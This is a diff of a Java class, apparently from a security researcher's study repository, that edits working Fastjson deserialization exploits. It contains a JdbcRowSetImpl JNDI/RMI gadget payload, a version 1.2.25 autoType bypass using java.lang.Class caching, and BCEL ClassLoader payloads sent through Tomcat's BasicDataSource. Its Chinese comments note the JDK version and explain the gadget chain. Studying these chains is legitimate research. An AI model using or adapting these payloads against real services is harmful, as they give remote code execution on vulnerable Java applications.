@@ -31,9 +31,11 @@ public class Fastjson1_2_24 {
         // Bypass1_2_25_BCEL();
     }
 
+    // 版本问题，jdk8u65
     private static void Bypass1_2_25_JNDI() {
         String payload = "{{\"@type\":\"java.lang.Class\", \"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
-                "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"DataSourceName\":\"rmi://127.0.0.1:1099/myRemote\", \"AutoCommit\":false}}";
+                "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"DataSourceName\":\"rmi://127.0.0.1:1099/myRemote\", \"autoCommit\":0}}";
+        System.out.println(payload);
         JSON.parse(payload);
     }
 
@@ -51,9 +53,19 @@ public class Fastjson1_2_24 {
                 "{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"," +
                     "\"DriverClassName\":\"$$BCEL$$" + code + "\"," +
                     "\"DriverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}}}";
+        System.out.println(payload);
         JSONObject jsonObject = JSON.parseObject(payload);
     }
 
+    /**
+     * 一部分是漏洞触发原理，一部分是 1.2.24 BCEL 链
+     *
+     * @throws IOException
+     * @throws ClassNotFoundException
+     * @throws InstantiationException
+     * @throws IllegalAccessException
+     * @throws SQLException
+     */
     private static void ClassLoaderGadget() throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, SQLException {
         // com.sun.org.apache.bcel.internal.util.ClassLoader 的基本的使用方法
         ClassLoader classLoader = new ClassLoader();
@@ -67,10 +79,11 @@ public class Fastjson1_2_24 {
         // basicDataSource.getConnection();
 
         // payload
-        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        // ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
         String payload = "{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"," +
                 "\"DriverClassName\":\"$$BCEL$$" + code + "\"," +
                 "\"DriverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}}";
+        System.out.println(payload);
         JSONObject jsonObject = JSON.parseObject(payload);
 
     }
@@ -90,7 +103,7 @@ public class Fastjson1_2_24 {
     }
 
     private static void JdbcRowSetImplGadget() {
-        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"DataSourceName\":\"rmi://127.0.0.1:1099/myRemote\", \"AutoCommit\":false}";
+        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"DataSourceName\":\"rmi://127.0.0.1:1099/myRemote\", \"autoCommit\":false}";
         JSON.parse(payload);
     }
 }
